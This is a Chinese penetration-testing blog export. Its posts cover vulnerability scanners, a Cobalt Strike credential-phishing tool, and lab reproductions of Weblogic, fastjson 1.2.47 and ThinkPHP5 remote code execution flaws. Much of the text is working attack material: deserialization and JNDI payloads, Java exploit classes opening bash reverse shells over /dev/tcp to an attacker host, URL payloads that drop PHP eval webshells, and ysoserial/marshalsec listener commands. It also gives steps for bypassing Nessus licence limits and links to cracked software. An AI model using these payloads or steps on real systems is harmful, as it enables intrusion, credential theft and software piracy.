<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030110314638.png" alt="image-20201030110314638"></p>
<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><p>扫描方式如下Crawl and audit为爬虫和审计</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030114119995.png" alt="image-20201030114119995"></p>
<p>结果如下</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030122154308.png" alt="image-20201030122154308"></p>
<h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><h4 id="Kali安装nessus"><a href="#Kali安装nessus" class="headerlink" title="Kali安装nessus"></a>Kali安装nessus</h4><p>官网下载如下版本</p>
<p>Nessus-8.12.0-debian6_amd64.deb</p>
<p>安装过程中选择如下</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031182217121.png" alt="image-20201031182217121"></p>
<p>继续选择如下选项</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031182309966.png" alt="image-20201031182309966"></p>
<p>填入账户密码，一般账户密码都设置为Nessus</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031182346493.png" alt="image-20201031182346493"></p>
<p><code>/opt/nessus/sbin/nessuscli fetch --challenge</code>获取Challenge code</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031190040607.png" alt="image-20201031190040607"></p>
<p><a href="https://zh-cn.tenable.com/products/nessus/nessus-essentials中输入邮箱和姓名，为了活着发到邮箱的激活码" target="_blank" rel="noopener">https://zh-cn.tenable.com/products/nessus/nessus-essentials中输入邮箱和姓名，为了活着发到邮箱的激活码</a></p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031190321722.png" alt="image-20201031190321722"></p>
<p><a href="https://plugins.nessus.org/v2/offline.php中输入之前获得的Challenge" target="_blank" rel="noopener">https://plugins.nessus.org/v2/offline.php中输入之前获得的Challenge</a> code和邮箱code  <img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031190726099.png" alt="image-20201031190726099"></p>
<p>之后得到最新插件下载地址</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031192257204.png" alt="image-20201031192257204"></p>
<p>获取nessus.license</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031192326221.png" alt="image-20201031192326221"></p>
<p>回到kali安装最新插件和nessus.license</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>nessus<span class="regexp">/sbin/</span>nessuscli update all-<span class="number">2.0</span>.tar.gz</span><br><span class="line"><span class="regexp">/opt/</span>nessus<span class="regexp">/sbin/</span>nessuscli fetch --register-offline nessus.license</span><br></pre></td></tr></table></figure>

<p>需要记录下版本的日期如下版本为20201019163</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031221426777.png" alt="image-20201031221426777"></p>
<p><code>service nessusd restart</code>  会重新编译</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031221505125.png" alt="image-20201031221505125"></p>
<p>此还是限制使用16个ip</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031224452826.png" alt="image-20201031224452826"></p>
<p>拷贝一份/opt/nessus/lib/nessus/plugins的内容</p>
<p>修改/opt/nessus/lib/nessus/plugins/和/opt/nessus/var/nessus/目录下plugin_feed_info.inc，日期修改为之前记录的日期</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101121120403.png" alt="image-20201101121120403"></p>
<p>重启后发现插件不见了，此时将plugin_feed_info.inc拷贝到/opt/nessus/lib/nessus/plugins/和/opt/nessus/var/nessus/目录下，重启nessus，发现已无限制</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101121844425.png" alt="image-20201101121844425"></p>
<p>再将之前拷贝的插件文件放到/opt/nessus/lib/nessus/plugins/下</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101133957447.png" alt="image-20201101133957447"></p>
<p>重启后可正常扫描，扫描如下</p>
<p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201101154513940.png" alt="image-20201101154513940"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Nessus对主机漏洞的发现最全面，AWVS发现Web应用漏洞较好，相比于Appscan和Burpsuite速度会快很多，Appscan相比于AWVS发现Web应用漏洞更全面，但会慢很多，运行Appscan的Windows也会比较卡。实际渗透过程中Burpsuite的爬虫配合Xray进行扫描会有一个比较好的效果，goby更适合突破边界后对内网的探测。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>appscan破解版</p>
<p><a href="https://mrxn.net/662.html" target="_blank" rel="noopener">https://mrxn.net/662.html</a></p>
<p>Nessus扫描器使用</p>
<p><a href="https://mp.weixin.qq.com/s/GB6pf7Fb2y0HinJPkswZag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/GB6pf7Fb2y0HinJPkswZag</a></p>
<p>Nessus扫描器破解</p>
<p><a href="https://mp.weixin.qq.com/s/9OCqVPfueKPczxY0xHhFKA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/9OCqVPfueKPczxY0xHhFKA</a></p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和.net加载</title>
    <url>/2020/10/26/Cobaltstrike%E4%B9%8B%E9%A1%B9%E7%9B%AE%E6%94%B6%E9%9B%86%E4%B8%8ECredentialPhisher%E9%92%93%E9%B1%BC%E9%A1%B9%E7%9B%AE%E6%BC%94%E7%A4%BA%E5%92%8C-net%E5%8A%A0%E8%BD%BD/</url>
    <content><![CDATA[<h3 id="Cobaltstrike项目收集"><a href="#Cobaltstrike项目收集" class="headerlink" title="Cobaltstrike项目收集"></a>Cobaltstrike项目收集</h3><p><a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a></p><h3 id="Invoke-CredentialPhisher钓鱼"><a href="#Invoke-CredentialPhisher钓鱼" class="headerlink" title="Invoke-CredentialPhisher钓鱼"></a>Invoke-CredentialPhisher钓鱼</h3><p>Invoke-CredentialPhisher是一个比较骚的项目，作者通过PSH实现了Windows几种场景下的钓鱼弹窗，诱导目标输出账号密码之后会带回teamserver，win7测试有点问题，但是win10效果比较好，窗口效果很逼真。作者博客有一篇文章专门介绍撰写思路，可以参考。</p><a id="more"></a>

<p>地址：</p>
<p><a href="https://github.com/fox-it/Invoke-CredentialPhisher.git" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-CredentialPhisher.git</a></p>
<p>文章参考地址：</p>
<p><a href="https://blog.fox-it.com/2018/08/14/phishing-ask-and-ye-shall-receive/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/08/14/phishing-ask-and-ye-shall-receive/</a></p>
<h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>导入项目，使用windows更新进行钓鱼</p>
<p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193122123.png" alt="image-20200901193122123"></p>
<p>进行配置如下</p>
<p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193147384.png" alt="image-20200901193147384"></p>
<p>Windows主机弹出更新</p>
<p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193220094.png" alt="image-20200901193220094"></p>
<p>用户输入数据</p>
<p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193253594.png" alt="image-20200901193253594"></p>
<p>cs返回结果</p>
<p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901193333921.png" alt="image-20200901193333921"></p>
<h3 id="net加载"><a href="#net加载" class="headerlink" title=".net加载"></a>.net加载</h3><p>.net加载使用命令如下</p>
<p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901163215946.png" alt="image-20200901163215946"></p>
<p><img src="//choge.top/2020/10/26/Cobaltstrike之项目收集与CredentialPhisher钓鱼项目演示和-net加载/image-20200901163308907.png" alt="image-20200901163308907"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic漏洞复现</title>
    <url>/2020/10/15/Weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>复现Weblogic经典CVE-2017-10271和CVE-2018-2628漏洞</p><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>启动Weblogic环境</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212210729.png" alt="image-20201015212210729"></p><p>进入如下路径进行查看，如果展示如下信息基本上存在漏洞</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212331129.png" alt="image-20201015212331129"></p><p>执行反弹shell命令，注意Content-Type要改成text/xml</p><p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212805855.png" alt="image-20201015212805855"></p><p>vps<code>nc -lvvp 5555</code>后成功反弹shell</p><a id="more"></a>







<p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015212830685.png" alt="image-20201015212830685"></p>
<p>写入一句话木马</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span> </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">    &lt;![CDATA[</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="perl"> out.<span class="keyword">print</span>(<span class="string">"test"</span>); </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml">    ]]&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015215109951.png" alt="image-20201015215109951"></p>
<p>一句话访问成功</p>
<p><a href="http://192.168.31.109:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://192.168.31.109:7001/bea_wls_internal/test.jsp</a></p>
<p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201015215205202.png" alt="image-20201015215205202"></p>
<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>Python攻击脚本下载地址</p>
<p><a href="https://www.exploit-db.com/exploits/44553" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44553</a></p>
<p>将Bash命令进行编码</p>
<p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027191914399.png" alt="image-20201027191914399"></p>
<p>vps执行以下命令</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">java</span> <span class="selector-tag">-cp</span> <span class="selector-tag">ysoserial-0</span><span class="selector-class">.0</span><span class="selector-class">.6-SNAPSHOT-BETA-all</span><span class="selector-class">.jar</span> <span class="selector-tag">ysoserial</span><span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span> <span class="selector-attr">[listen port]</span> <span class="selector-tag">CommonsCollections1</span> <span class="selector-attr">[command]</span></span><br><span class="line">## <span class="selector-attr">[listen port]</span> 监听端口</span><br><span class="line">## <span class="selector-attr">[command]</span> 需要执行的命令</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027191958247.png" alt="image-20201027191958247"></p>
<p>攻击机执行以下命令</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python</span> 44553<span class="selector-class">.py</span> <span class="selector-attr">[目标ip]</span> <span class="selector-attr">[目标端口]</span> <span class="selector-attr">[本地ysoserial路径]</span> <span class="selector-attr">[vpsip]</span> <span class="selector-attr">[JRMP监听端口]</span> <span class="selector-attr">[JRMPclient]</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027192057654.png" alt="image-20201027192057654"></p>
<p>成功反弹shell</p>
<p><img src="//choge.top/2020/10/15/Weblogic漏洞复现/image-20201027191827641.png" alt="image-20201027191827641"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson反序列化漏洞复现</title>
    <url>/2020/10/12/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>本文主要复现Fastjson 1.2.47 远程命令执行漏洞</p><h3 id="判断是否使用fastjson"><a href="#判断是否使用fastjson" class="headerlink" title="判断是否使用fastjson"></a>判断是否使用fastjson</h3><p>启动环境，可以根据logo图标判断是否使用了fastjson</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013165844484.png" alt="image-20201013165844484"></p><p>转换为post方式提交，查看放回包也可以判断是否使用了fastjson</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015140321953.png" alt="image-20201015140321953"></p><p>DNSLog判断</p><p>判断payload</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.Inet4Address"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.Inet6Address"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.InetSocketAddress"</span>&#123;<span class="string">"address"</span>:, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.alibaba.fastjson.JSONObject"</span>, &#123;<span class="string">"@type"</span>: <span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;<span class="string">""</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;:<span class="string">"aaa"</span>&#125;</span><br><span class="line">Set[&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;]</span><br><span class="line">Set[&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;:<span class="number">0</span></span><br></pre></td></tr></table></figure><a id="more"></a>








<p>以上payload填入以下代码{“a”:}中的:后面</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"ldap://6v0jfv.dnslog.cn"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>DNSLog有回显，存在fastjson</p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134453665.png" alt="image-20201015134453665"></p>
<h3 id="RMI模式getshell"><a href="#RMI模式getshell" class="headerlink" title="RMI模式getshell"></a>RMI模式getshell</h3><p>exp项目地址：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
<p>代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>VPS中下载此项目，将其中ip和监听端口修改为vps的ip和需要监听的端口，同时使用nc监听1234端口，<code>nc -lvvp 1234</code></p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201014193236513.png" alt="image-20201014193236513"></p>
<p><code>javac Exploit.java</code>编译出Exploit.class文件</p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013215823894.png" alt="image-20201013215823894"></p>
<p>vps启动一个web服务，要求能访问到Exploit.class</p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013220111504.png" alt="image-20201013220111504"></p>
<p>VPS启一个rmi监听9999端口</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all<span class="selector-class">.jar</span> marshalsec<span class="selector-class">.jndi</span><span class="selector-class">.RMIRefServer</span> <span class="string">"http://vpsip:8082/#Exploit"</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141543905.png" alt="image-20201015141543905"></p>
<p>Burpsuite将请求转换为post模式，执行以下payload，注意如果无法解析json需要在请求头中加入<code>COntent-Type: application/json</code></p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141512313.png" alt="image-20201015141512313"></p>
<p>vps反弹shell，执行命令成功</p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141635598.png" alt="image-20201015141635598"></p>
<h3 id="ldap模式getshell"><a href="#ldap模式getshell" class="headerlink" title="ldap模式getshell"></a>ldap模式getshell</h3><p>vps执行如下代码</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all<span class="selector-class">.jar</span> marshalsec<span class="selector-class">.jndi</span><span class="selector-class">.LDAPRefServer</span> <span class="string">"http://vpsip:8082/#Exploit"</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183410772.png" alt="image-20201015183410772"></p>
<p>Burpsuite执行如下payload</p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183508190.png" alt="image-20201015183508190"></p>
<p>成功反弹shell</p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183614612.png" alt="image-20201015183614612"></p>
<p>修复参考如下</p>
<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134754660.png" alt="image-20201015134754660"></p>
<p>其他java利用代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.142.44/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html" target="_blank" rel="noopener">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
<p>fastjson绕过</p>
<p><a href="https://mp.weixin.qq.com/s/pL338gF1pfF2c8WA5rTEcw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pL338gF1pfF2c8WA5rTEcw</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp5远程代码执行漏洞复现</title>
    <url>/2020/10/12/Thinkphp5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>本文主要复现Thinkphp5远程代码执行漏洞</p><h3 id="Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability"><a href="#Thinkphp5-5-0-22-5-1-29-Remote-Code-Execution-Vulnerability" class="headerlink" title="Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability"></a>Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability</h3><p>启动Thinkphp5环境，可以通过页面多处特征判断是否采用了Thinkphp5框架</p><p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012143945259.png" alt="image-20201012143945259"></p><p>payload判断是否存在远程代码执行漏洞</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=-1%20and%20it%27ll%20execute%20the%20phpinfo</span><br></pre></td></tr></table></figure><a id="more"></a>





<p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012144135699.png" alt="image-20201012144135699"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?s=index/think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012144355244.png" alt="image-20201012144355244"></p>
<p>写入shell</p>
<p>Windows环境</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8080</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php</span><br></pre></td></tr></table></figure>

<p>Linux环境</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8080</span>/index.php?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20%27%3C?php%20@eval($_GET[%22code%22])?%3E%27%3Eshell.php</span><br></pre></td></tr></table></figure>

<p>使用如下方式对Linux环境进行写入shell</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://127.0.0.1:8080/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=file<span class="emphasis">_put_</span>contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3C?php%20@eval($<span class="emphasis">_GET[%22code%22])?%3Ei</span></span><br></pre></td></tr></table></figure>

<p>查看写入成功</p>
<p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012151125914.png" alt="image-20201012151125914"></p>
<p>访问如下，写入成功</p>
<p><img src="//choge.top/2020/10/12/Thinkphp5远程代码执行漏洞复现/image-20201012151400117.png" alt="image-20201012151400117"></p>
<p>注意有时候需要加入/public目录进行测试</p>
<p><a href="http://localhost:9096/public/index.php?s=" target="_blank" rel="noopener">http://localhost:9096/public/index.php?s=</a></p>
<h3 id="ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability"><a href="#ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability" class="headerlink" title="ThinkPHP5 5.0.23 Remote Code Execution Vulnerability"></a>ThinkPHP5 5.0.23 Remote Code Execution Vulnerability</h3><p>ThinkPHP5 5.0.23直接通过post形式可以实现远程命令执行，如下</p>
